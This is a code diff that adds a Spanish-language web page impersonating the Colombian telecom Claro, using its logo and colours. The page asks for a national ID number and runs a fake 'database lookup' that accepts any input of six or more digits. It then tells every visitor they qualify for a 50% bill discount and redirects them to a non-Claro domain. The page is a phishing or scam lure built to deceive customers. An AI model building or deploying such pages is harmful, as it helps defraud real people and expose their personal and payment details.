@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap" rel="stylesheet" />
+  <title>Beneficio Cliente Antiguo</title>
+
+  <style>
+    body { font-family: "Open Sans", sans-serif; }
+    .loader-rojo {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #EF3320;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+
+<body class="bg-gray-50 text-gray-800 antialiased">
+
+  <header class="bg-[#EF3320] h-14 flex items-center px-6 justify-between shadow-md">
+    <img class="w-20" src="https://www.claro.com.co/portal/recursos/co/cpp/promociones/imagenes/1577369371861-logo-claro-blanco.png" alt="Claro">
+    <span class="text-white font-bold text-sm">Beneficios Exclusivos</span>
+  </header>
+
+  <main class="px-4 py-10 max-w-xl mx-auto">
+    
+    <div id="step-form" class="bg-white p-8 rounded-2xl shadow-lg border border-gray-100 text-center">
+      <h2 class="text-2xl font-bold text-gray-700 mb-4">¡Consulta tu beneficio!</h2>
+      <p class="text-gray-600 mb-6">Ingresa tu número de cédula para verificar si tienes descuentos disponibles en tu factura.</p>
+      
+      <div class="text-left mb-6">
+        <label for="cedula" class="text-sm font-semibold text-gray-500 block mb-2">Número de Cédula</label>
+        <input id="cedula" type="tel" inputmode="numeric" maxlength="10" placeholder="Ej: 10203040"
+          class="w-full px-4 py-3 border-2 border-gray-200 rounded-xl focus:outline-none focus:border-[#EF3320] transition-colors text-lg" />
+        <p id="error-msg" class="hidden text-red-500 text-sm mt-2 font-medium">Por favor ingresa una cédula válida.</p>
+      </div>
+
+      <button onclick="validarCedula()" class="bg-[#EF3320] text-white font-bold rounded-full py-4 px-10 w-full text-lg hover:bg-red-700 transition-all shadow-lg">
+        Verificar cuenta
+      </button>
+    </div>
+
+    <div id="step-loader" class="hidden bg-white p-12 rounded-2xl shadow-lg text-center">
+      <div class="flex flex-col items-center">
+        <div class="loader-rojo mb-4"></div>
+        <p class="text-lg font-semibold text-gray-600">Consultando en nuestra base de datos...</p>
+        <p class="text-sm text-gray-400 mt-2">Esto tomará solo unos segundos.</p>
+      </div>
+    </div>
+
+    <div id="step-result" class="hidden bg-white p-8 rounded-2xl shadow-lg border-2 border-green-500 text-center">
+      <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7" />
+        </svg>
+      </div>
+      <h2 class="text-2xl font-bold text-gray-800 mb-2">¡Felicidades!</h2>
+      <p class="text-lg text-gray-700 mb-4">Detectamos que eres <strong>cliente antiguo</strong>.</p>
+      <div class="bg-yellow-50 p-4 rounded-xl border border-yellow-200 mb-6">
+        <p class="text-[#EF3320] font-extrabold text-xl">
+          Cumples los requisitos para pagar tu factura al 50%.
+        </p>
+      </div>
+     <button onclick="window.location.href='https://claroservicio.on-forge.com'" class="bg-[#EF3320] text-white font-bold rounded-full py-3 px-8 w-full hover:bg-red-700 transition-all">
+  Aplicar descuento ahora
+</button>
+    </div>
+
+  </main>
+
+  <script>
+    function validarCedula() {
+      const cedula = document.getElementById('cedula').value;
+      const errorMsg = document.getElementById('error-msg');
+      
+      if (cedula.length < 6) {
+        errorMsg.classList.remove('hidden');
+        return;
+      }
+
+      errorMsg.classList.add('hidden');
+      
+      // Cambiar a vista de Loader
+      document.getElementById('step-form').classList.add('hidden');
+      document.getElementById('step-loader').classList.remove('hidden');
+
+      // Esperar 4 segundos (4000ms)
+      setTimeout(() => {
+        document.getElementById('step-loader').classList.add('hidden');
+        document.getElementById('step-result').classList.remove('hidden');
+      }, 4000);
+    }
+  </script>
+
+</body>
+</html>
